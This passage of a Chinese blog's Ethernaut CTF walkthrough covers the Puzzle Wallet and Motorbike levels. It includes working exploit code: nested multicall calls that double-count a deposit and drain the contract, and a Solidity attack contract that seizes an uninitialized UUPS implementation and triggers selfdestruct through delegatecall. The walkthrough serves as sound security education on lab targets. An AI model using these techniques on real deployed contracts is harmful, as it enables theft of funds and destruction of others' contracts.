<p>这两个合约使用逻辑合约的 ABI 创建了 Web3 合约对象，但使用代理合约的地址，即可以与逻辑合约进行交互。当用逻辑合约函数的数据调用代理合约时，由于该函数在代理中不存在，它的回退函数运行并通过<code>delegatecall</code>将调用重定向到逻辑合约。因此，控制台中的合约就是代理合约，如果要调用 proposeNewAdmin()，就需要调用控制台中的合约，但不可以使用在控制台定义的ABI中的函数，这里的ABI是逻辑ABI。</p>
</blockquote>
<p>在成为 owner 后调用<code>addToWhitelist</code>，将 player 添加到白名单中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.addToWhitelist(player);</span><br><span class="line"><span class="keyword">await</span> contract.whitelisted(player);</span><br></pre></td></tr></table></figure>

<p><img src="/image/Ethernaut.assets/image-20230115185459052.png" alt="image-20230115185459052"></p>
<p>我们的最终目的是成为<code>PuzzleProxy</code>合约的owner，因此可以利用相同的漏洞在<code>PuzzleWallet</code>中使用 <code>delegatecall</code>修改<code>maxBalance</code>，由于在<code>init</code>函数中对 maxBalance 的值有限制，我们只能调用<code>setMaxBalance</code>函数，而要调用这个函数，就需要使合约中的余额清零。由合约代码可知，<code>execute</code>取款函数在取款时检查了我们的余额，我们只能取出自己存入的余额，而合约初始就有0.001ether，只靠这个函数是无法让合约余额清0的。需要使用<code>multicall</code>函数。</p>
<p><code>multicall</code>函数允许用户将多个调用一起处理以达到节省 gas 的目的，该函数通过一下代码检查是否是第一次调用<code>deposit</code>函数，通过判断目前执行的方法的函数选择器是否与deposit的函数选择器一致，因此我们只能调用一次<code>deposit</code>函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>但是<code>multicall</code>并不会检查自己，由于<code>multicall</code>可以执行任意代码，因此可以用<code>multicall</code>来包装<code>deposit</code>来绕过对函数选择器的检查，所以通过<code>multicall</code>调用<code>deposit</code>和<code>multicall(deposit)</code>，在实际只发送0.001 ether的情况下，合约实际的余额<code>balanace</code>为0.002 ether，此时<code>balances[player]</code>和合约余额数值相等，因此再执行一次<code>execute</code>全部提款即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> interface = <span class="keyword">new</span> ethers.utils.Interface([</span><br><span class="line">  <span class="string">&#x27;function deposit()&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;function multicall(bytes[])&#x27;</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个参数是 multicall 的参数组，其中 multicall (bytes[]) 的第一个参数本身就是一个参数组。这就是为什么有两个参数。</span></span><br><span class="line"><span class="keyword">const</span> payload = interface.encodeFunctionData(<span class="string">&#x27;multicall&#x27;</span>, [[interface.getSighash(<span class="string">&#x27;deposit()&#x27;</span>)]]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* payload explanation:</span></span><br><span class="line"><span class="comment">0xac9650d8: 这是 multicall 的任数签名。后面有五个 32 字节的段（为方方便起见，提供了从头的偏移量（十六进制））</span></span><br><span class="line"><span class="comment">000: 0000000000000000000000000000000000000000000000000000000000000020</span></span><br><span class="line"><span class="comment">020: 0000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="comment">040: 0000000000000000000000000000000000000000000000000000000000000020</span></span><br><span class="line"><span class="comment">060: 0000000000000000000000000000000000000000000000000000000000000004</span></span><br><span class="line"><span class="comment">080: d0e30db000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">000: 由于 bytes[] 具有动态长度，因此该段指示指定位 bytes[] 数据的偏移量。</span></span><br><span class="line"><span class="comment">020: bytes[]是一个变长数组，所以这段表示数组的长度。</span></span><br><span class="line"><span class="comment">040: 数组中的数据（byte）也是动态的，因此该段包含确定字节数据的偏移量</span></span><br><span class="line"><span class="comment">060: bytes是一个变长数组，所以这一段表示数组的长度</span></span><br><span class="line"><span class="comment">080: 最后，实际数据。这是 deposit() 的 4 字节函数选择器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将两个 multicall(deposit())作为参数传递为 multicall，发送的金额为 0.001 eth，此次交易将执行两次 deposit，将 balances 设置为 0.002 eth</span></span><br><span class="line"><span class="keyword">await</span> contract.multicall([payload, payload], &#123;<span class="attr">value</span>: toWei(<span class="string">&#x27;0.001&#x27;</span>)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 execute 将合约中的余额消耗尽，这里的 data 不需要实际内容</span></span><br><span class="line"><span class="keyword">await</span> contract.execute(player, toWei(<span class="string">&#x27;0.002&#x27;</span>),</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后利用相同的方法调用<code>await contract.setMaxBalance(player);</code>，修改<code>PuzzleProxy</code>合约中的 slot 1，即将 owner 修改为自己。</p>
<h3 id="25-Motorbike"><a href="#25-Motorbike" class="headerlink" title="25. Motorbike"></a>25. Motorbike</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    </span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;</span><br><span class="line">        (bool success,) = _logic.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Delegates the current call to `implementation`.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function that delegates calls to the address returned by `_implementation()`. </span><br><span class="line">    // Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Upgrade the implementation of the proxy to `newImplementation`</span><br><span class="line">    // subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(address newImplementation,bytes memory data) internal &#123;</span><br><span class="line">        // Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) = newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        </span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题算是上面题目的简单版本，最终的目的是让合约执行<code>selfdestruct</code>函数自毁，在获得新实例后，在控制台获取的合约地址实际是<code>Motorbike</code>的地址，而<code>Engine</code>合约则被部署在了<code>_IMPLEMENTATION_SLOT</code>上。</p>
<p><code>Engine</code>中的该<code>initialize()</code>函数是一个伪构造函数，它允许代理合约在升级到新的实现逻辑合约时执行类似构造函数的操作。由于<code>constructor</code>代理不能调用实现的 ，因此该<code>initialize</code>函数取代了构造函数的位置。但是，请记住，这<code>initialize</code>对 Solidity 没有特殊意义——它只是可升级合约中常用的命名约定。就 Solidity 而言，<code>initialize</code>这只是另一个功能。</p>
<p>在获取到实例地址后先读取出<code>Enginr</code>的地址：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MotorBikeAddr = <span class="string">&quot;0x341f91ADf4e053242098f321D0aB9845d127F4A7&quot;</span></span><br><span class="line"><span class="keyword">const</span> slot = <span class="string">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span></span><br><span class="line"><span class="keyword">const</span> EngineAddr = <span class="keyword">await</span> provider.getStorageAt(MotorBikeAddr, slot)</span><br><span class="line"><span class="comment">// 0x000000000000000000000000a75ad15322afa9a93a3dcb10b80accac24a7a3a3</span></span><br></pre></td></tr></table></figure>

<p>然后再读区一下<code>Enginr</code>合约中的<code>upgrader和horsePower</code>变量的内容。</p>
<p><img src="/image/Ethernaut.assets/image-20230223164319975.png" alt="image-20230223164319975"></p>
<p>他们的内容都为 <code>0</code>，说明此时<code>Engine</code>合约还没有执行<code>initialize()</code>函数，因此，我们可以通过外部调用<code>Engine</code>合约的<code>initialize()</code>函数，来让<code>Engine</code>合约的upgrader变成我们的地址。</p>
<p>又由于<code>upgradeToAndCall</code>函数调用了<code>_upgradeToAndCall</code>函数，而<code>_upgradeToAndCall</code>内部执行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool success,) = newImplementation.delegatecall(data);</span><br></pre></td></tr></table></figure>

<p>这里<code>newImplementation</code>和<code>data</code>都是完全可控的，因此在这里设置<code>newImplementation</code>为我们自定义的恶意合约地址，<code>data</code>设定为自毁函数的<code>函数选择器</code>值，由于<code>delegatecall</code>是在本函数的上下文执行的，因此执行远程函数代码中的<code>selfdestruct</code>时，这个合约就会自毁，从而达到题目条件</p>
<p>攻击代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.7.0;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line">    address target;</span><br><span class="line">    </span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1_BeUpgrader() public &#123;</span><br><span class="line">        (bool succ, ) = target.call(abi.encodeWithSignature(&quot;initialize()&quot;));</span><br><span class="line">        require(succ,&quot;step1 failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step2_Exp() public &#123;</span><br><span class="line">        Bomb bomb = new Bomb();</span><br><span class="line">        (bool succ, ) = target.call(abi.encodeWithSignature(&quot;upgradeToAndCall(address,bytes)&quot;,address(bomb),abi.encodeWithSignature(&quot;destruct()&quot;)));</span><br><span class="line">        require(succ,&quot;step2 failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bomb &#123;</span><br><span class="line">    function destruct()  external &#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Banana69</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://banana69.site/2023/02/23/Ethernaut/">https://banana69.site/2023/02/23/Ethernaut/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Banana69.site" target="_blank">Banana69</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CTF/">智能合约 CTF</a></div><div class="post_share"></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Banana69</div><div class="author-info__description">菜鸡的博客</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Banannna69"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Banannna69" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:junminn@126.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Fallback"><span class="toc-text">1. Fallback</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Fallout"><span class="toc-text">2. Fallout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Coin-Flip"><span class="toc-text">3. Coin Flip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Telephone"><span class="toc-text">4. Telephone</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Token"><span class="toc-text">5. Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Delegation"><span class="toc-text">6. Delegation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Force"><span class="toc-text">7. Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-Vault"><span class="toc-text">8. Vault</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-King"><span class="toc-text">9. King</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-Re-entrancy"><span class="toc-text">10. Re-entrancy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-Elevtor"><span class="toc-text">11. Elevtor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-Privacy"><span class="toc-text">12. Privacy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-Gatekeeper-One"><span class="toc-text">13. Gatekeeper One</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-Gatekeeper-Two"><span class="toc-text">14. Gatekeeper Two</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-Naugth-Coin"><span class="toc-text">15. Naugth Coin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-Preservation"><span class="toc-text">16. Preservation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-Recovery"><span class="toc-text">17. Recovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-MagicNumber"><span class="toc-text">18. MagicNumber</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-Alien-Codex"><span class="toc-text">19. Alien Codex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-Denial"><span class="toc-text">20. Denial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-Shop"><span class="toc-text">21. Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-Dex"><span class="toc-text">22. Dex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-Dex2"><span class="toc-text">23. Dex2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-Puzzle-Wallet"><span class="toc-text">24. Puzzle Wallet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-Motorbike"><span class="toc-text">25. Motorbike</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/03/Hot100/" title="LeetCode 热题 HOT 100 - 简单">LeetCode 热题 HOT 100 - 简单</a><time datetime="2023-03-02T16:00:00.000Z" title="发表于 2023-03-03 00:00:00">2023-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/02/23/Ethernaut/" title="Ethernaut 题解">Ethernaut 题解</a><time datetime="2023-02-22T16:00:00.000Z" title="发表于 2023-02-23 00:00:00">2023-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/02/21/Upgradeable-Contract/" title="Upgradeable Contract 可升级合约">Upgradeable Contract 可升级合约</a><time datetime="2023-02-21T11:09:45.000Z" title="发表于 2023-02-21 19:09:45">2023-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/02/05/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" title="OrionProtocol攻击分析">OrionProtocol攻击分析</a><time datetime="2023-02-05T15:37:00.000Z" title="发表于 2023-02-05 23:37:00">2023-02-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/02/04/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/" title="Java 登录认证">Java 登录认证</a><time datetime="2023-02-04T09:36:53.000Z" title="发表于 2023-02-04 17:36:53">2023-02-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By Banana69</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>